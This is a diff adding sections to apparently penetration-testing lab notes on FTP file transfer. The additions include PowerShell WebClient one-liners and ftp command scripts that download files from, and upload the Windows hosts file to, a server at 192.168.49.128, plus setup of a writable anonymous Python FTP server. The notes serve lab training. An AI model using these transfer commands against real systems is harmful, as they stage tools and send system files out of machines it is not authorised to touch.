@@ -67,6 +67,20 @@ lcd /home/<your-username>
 quit
 ```
 
+* <mark style="color:purple;">Transferring files using</mark> <mark style="color:orange;">**`powershell`**</mark><mark style="color:purple;">:</mark>
+
+{% code overflow="wrap" %}
+```powershell
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+{% endcode %}
+
+* <mark style="color:purple;">Upload a file using</mark> <mark style="color:orange;">**`powershell`**</mark>
+
+```powershell
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
 * <mark style="color:purple;">If</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">login is enabled, use</mark> <mark style="color:orange;">**`curl`**</mark><mark style="color:purple;">:</mark>
 
 ```sh
@@ -120,6 +134,63 @@ dir
 ```
 
 * <mark style="color:purple;">This is the default config file for</mark> <mark style="color:orange;">**`TFTP`**</mark> <mark style="color:purple;">--></mark> <mark style="color:orange;">**`tftpd-hpa`**</mark>
+{% endhint %}
+
+***
+
+{% hint style="info" %}
+### <mark style="color:orange;">`FTP`</mark> <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Server</mark>
+
+* <mark style="color:purple;">First, Install the</mark> <mark style="color:green;">**`Python`**</mark> <mark style="color:purple;">module:</mark>
+
+```sh
+sudo pip3 install pyftpdlib
+```
+
+* <mark style="color:purple;">Then, set the server:</mark>
+
+```sh
+sudo python3 -m pyftpdlib --port 21
+```
+
+* <mark style="color:purple;">By default,</mark> <mark style="color:orange;">**`pyftpdlib`**</mark> <mark style="color:purple;">uses</mark> <mark style="color:orange;">**`Port 2121`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">authentication is enabled by default if we don't set a user and password.</mark>
+* <mark style="color:purple;">Allow users to upload files:</mark>
+
+```sh
+sudo python3 -m pyftpdlib --port 21 --write
+```
+{% endhint %}
+
+***
+
+{% hint style="info" %}
+### <mark style="color:purple;">Create a command file</mark>
+
+* <mark style="color:purple;">Is possible to create command files and execute then using the</mark> <mark style="color:orange;">**`-s`**</mark> <mark style="color:purple;">flag:</mark>
+
+```sh
+ftp -v -n -s:ftpcommand.txt
+```
+
+* <mark style="color:purple;">Copy this in to a file to create a script that will</mark> <mark style="color:orange;">**`download`**</mark> <mark style="color:purple;">a file:</mark>
+
+```sh
+open 192.168.49.128
+USER anonymous
+binary
+GET file.txt
+bye
+```
+
+* <mark style="color:purple;">Copy this in to a file to create a script that will</mark> <mark style="color:orange;">**`upload`**</mark> <mark style="color:purple;">a file to the server:</mark>
+
+```sh
+open 192.168.49.128
+USER anonymous
+binary
+PUT c:\windows\system32\drivers\etc\hosts
+bye
+```
 {% endhint %}
 
 ***
